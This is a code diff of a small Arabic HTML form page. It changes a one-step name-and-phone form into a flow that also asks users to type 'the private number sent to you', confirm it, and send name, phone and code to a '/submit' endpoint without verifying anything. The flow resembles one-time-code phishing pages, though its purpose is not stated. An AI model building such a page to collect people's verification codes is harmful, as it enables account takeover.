@@ -1,100 +1,100 @@
-```html
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
+
 <head>
+
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <meta
+    name="viewport"
+    content="width=device-width, initial-scale=1.0"
+  >
 
   <title>amirr cx</title>
 
   <style>
+
     body {
       font-family: Arial, sans-serif;
-      margin: 0;
-      min-height: 100vh;
-
-      background-image: url('data:image/jpeg;base64,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');
-
-      background-size: cover;
-      background-position: center;
-      background-attachment: fixed;
-
-      display: flex;
-      align-items: center;
-      justify-content: center;
+      max-width: 400px;
+      margin: 60px auto;
+      text-align: center;
+      padding: 20px;
     }
 
     .card {
-      background: rgba(0, 0, 0, 0.55);
-      backdrop-filter: blur(6px);
-      border-radius: 16px;
-      padding: 40px 30px;
-      max-width: 380px;
-      width: 90%;
-      text-align: center;
-      color: white;
+      padding: 30px;
+      border-radius: 15px;
+      background: #f5f5f5;
     }
 
     h1 {
-      margin-bottom: 24px;
-      font-size: 2rem;
+      margin-bottom: 25px;
     }
 
     label {
       display: block;
       text-align: right;
-      margin-bottom: 4px;
-      font-size: 0.9rem;
-      color: #ddd;
+      margin-bottom: 6px;
     }
 
     input {
-      padding: 10px;
+      padding: 12px;
       width: 100%;
-      margin-bottom: 16px;
-      border-radius: 8px;
-      border: none;
-      font-size: 1rem;
+      margin-bottom: 18px;
       box-sizing: border-box;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      font-size: 16px;
     }
 
     button {
-      padding: 12px 30px;
-      background: #f59e0b;
-      color: white;
+      padding: 12px 25px;
+      width: 100%;
       border: none;
       border-radius: 8px;
-      font-size: 1rem;
+      background: #111;
+      color: white;
+      font-size: 16px;
       cursor: pointer;
-      width: 100%;
     }
 
     button:hover {
-      background: #d97706;
+      background: #333;
     }
 
     .hidden {
       display: none;
     }
 
-    .special-number {
-      font-size: 3rem;
+    .private-number {
+      font-size: 35px;
       font-weight: bold;
-      color: #f59e0b;
-      margin: 20px 0;
-      direction: ltr;
+      margin: 25px 0;
     }
 
-    .success {
-      font-size: 1rem;
-      color: #ddd;
+    .message {
+      line-height: 1.8;
     }
+
+    #result,
+    #result2 {
+      margin-top: 15px;
+    }
+
   </style>
+
 </head>
+
 
 <body>
 
+
+  <!-- ================================= -->
   <!-- الصفحة الأولى -->
+  <!-- الاسم + رقم الهاتف فقط -->
+  <!-- ================================= -->
+
   <div class="card" id="page1">
 
     <h1>بياناتك</h1>
@@ -105,94 +105,242 @@
       type="text"
       id="name"
       placeholder="اكتب اسمك"
-      autocomplete="name"
     >
+
 
     <label>رقم الهاتف:</label>
 
     <input
       type="tel"
       id="phone"
-      placeholder="01012345678"
-      autocomplete="tel"
+      placeholder="اكتب رقم الهاتف"
     >
 
-    <button onclick="submitData()">
-      إرسال
+
+    <button onclick="goToPage2()">
+      التالي
     </button>
+
 
     <p id="result"></p>
 
   </div>
 
 
+
+  <!-- ================================= -->
   <!-- الصفحة الثانية -->
+  <!-- الرقم الخاص -->
+  <!-- ================================= -->
+
   <div class="card hidden" id="page2">
+
+    <h1>الرقم الخاص</h1>
+
+    <p class="message">
+      اكتب الرقم الخاص الذي تم إرساله لك
+    </p>
+
+
+    <label>الرقم الخاص:</label>
+
+    <input
+      type="text"
+      id="code"
+      placeholder="اكتب الرقم الخاص"
+      inputmode="numeric"
+    >
+
+
+    <button onclick="showConfirmation()">
+      التالي
+    </button>
+
+
+    <p id="result2"></p>
+
+  </div>
+
+
+
+  <!-- ================================= -->
+  <!-- تأكيد الرقم -->
+  <!-- ================================= -->
+
+  <div class="card hidden" id="page3">
+
+    <h1>تأكيد الرقم</h1>
+
+    <p class="message">
+      الرقم الخاص الذي أدخلته هو:
+    </p>
+
+
+    <div
+      class="private-number"
+      id="showCode"
+    ></div>
+
+
+    <p class="message">
+      إذا كان الرقم صحيحًا اضغط OK
+    </p>
+
+
+    <button onclick="submitFinalData()">
+      OK
+    </button>
+
+
+    <p id="result3"></p>
+
+  </div>
+
+
+
+  <!-- ================================= -->
+  <!-- نجاح -->
+  <!-- ================================= -->
+
+  <div class="card hidden" id="page4">
 
     <h1>تم التسجيل بنجاح ✅</h1>
 
-    <p>رقمك الخاص هو:</p>
-
-    <div class="special-number" id="specialNumber"></div>
-
-    <p class="success">
-      احتفظ بهذا الرقم الخاص بك.
+    <p class="message">
+      تم حفظ بياناتك بنجاح.
     </p>
 
   </div>
+
 
 
   <script>
 
     const SERVER_URL = '';
 
-    /*
-      قراءة الرقم الخاص من اللينك
 
-      مثال:
-      https://example.com/?code=12345
-
-      النتيجة:
-      code = 12345
-    */
-
-    const urlParams = new URLSearchParams(window.location.search);
-
-    const specialCode = urlParams.get('code');
+    // البيانات المؤقتة
+    let userData = {
+      name: '',
+      phone: '',
+      code: ''
+    };
 
 
-    // التأكد أن اللينك يحتوي على رقم خاص
-    if (!specialCode) {
+    // =================================
+    // الصفحة الأولى
+    // =================================
 
-      document.getElementById("page1").innerHTML = `
-        <h1>الرابط غير صحيح</h1>
-        <p>هذا الرابط لا يحتوي على رقم خاص.</p>
-      `;
+    function goToPage2() {
+
+      const name =
+        document
+          .getElementById('name')
+          .value
+          .trim();
+
+
+      const phone =
+        document
+          .getElementById('phone')
+          .value
+          .trim();
+
+
+      // التأكد من الاسم والموبايل
+      if (!name || !phone) {
+
+        document
+          .getElementById('result')
+          .innerText =
+            'من فضلك اكتب الاسم ورقم الهاتف';
+
+        return;
+      }
+
+
+      // حفظ البيانات مؤقتًا
+      userData.name = name;
+      userData.phone = phone;
+
+
+      // إخفاء الصفحة الأولى
+      document
+        .getElementById('page1')
+        .classList.add('hidden');
+
+
+      // إظهار الصفحة الثانية
+      document
+        .getElementById('page2')
+        .classList.remove('hidden');
 
     }
 
 
-    // إرسال البيانات
-    function submitData() {
 
-      const name =
-        document.getElementById("name").value.trim();
+    // =================================
+    // الصفحة الثانية
+    // إدخال الرقم الخاص
+    // =================================
 
-      const phone =
-        document.getElementById("phone").value.trim();
+    function showConfirmation() {
+
+      const code =
+        document
+          .getElementById('code')
+          .value
+          .trim();
 
 
-      if (!name || !phone) {
+      // التأكد من الرقم
+      if (!code) {
 
-        alert("من فضلك اكتب الاسم ورقم الهاتف");
+        document
+          .getElementById('result2')
+          .innerText =
+            'من فضلك اكتب الرقم الخاص';
 
         return;
-
       }
 
 
-      document.getElementById("result").innerText =
-        "جاري إرسال البيانات...";
+      // حفظ الرقم مؤقتًا
+      userData.code = code;
+
+
+      // إظهار الرقم للتأكيد
+      document
+        .getElementById('showCode')
+        .innerText = code;
+
+
+      // إخفاء الصفحة الثانية
+      document
+        .getElementById('page2')
+        .classList.add('hidden');
+
+
+      // إظهار صفحة التأكيد
+      document
+        .getElementById('page3')
+        .classList.remove('hidden');
+
+    }
+
+
+
+    // =================================
+    // الضغط على OK
+    // هنا فقط يتم الحفظ
+    // =================================
+
+    function submitFinalData() {
+
+      document
+        .getElementById('result3')
+        .innerText =
+          'جاري حفظ البيانات...';
 
 
       fetch(SERVER_URL + '/submit', {
@@ -205,54 +353,58 @@
 
         body: JSON.stringify({
 
-          name: name,
+          name: userData.name,
 
-          phone: phone,
+          phone: userData.phone,
 
-          code: specialCode
+          code: userData.code
 
         })
 
       })
 
-      .then(res => res.json())
+
+      .then(response => response.json())
+
 
       .then(data => {
 
         if (data.success) {
 
-          // إخفاء الصفحة الأولى
+          // إخفاء صفحة التأكيد
           document
-            .getElementById("page1")
-            .classList.add("hidden");
+            .getElementById('page3')
+            .classList.add('hidden');
 
 
-          // وضع الرقم الخاص
+          // إظهار صفحة النجاح
           document
-            .getElementById("specialNumber")
-            .innerText = data.code;
+            .getElementById('page4')
+            .classList.remove('hidden');
 
+        }
 
-          // إظهار الصفحة الثانية
+        else {
+
           document
-            .getElementById("page2")
-            .classList.remove("hidden");
-
-        } else {
-
-          document.getElementById("result").innerText =
-            data.error || "حدث خطأ أثناء الإرسال";
+            .getElementById('result3')
+            .innerText =
+              data.error ||
+              'حدث خطأ أثناء الحفظ';
 
         }
 
       })
 
-      .catch(err => {
 
-        console.error(err);
+      .catch(error => {
 
-        document.getElementById("result").innerText =
-          "تعذر الاتصال بالسيرفر";
+        console.error(error);
+
+        document
+          .getElementById('result3')
+          .innerText =
+            'تعذر الاتصال بالسيرفر';
 
       });
 
@@ -260,7 +412,7 @@
 
   </script>
 
-</body>
-</html>
-```
 
+</body>
+
+</html>
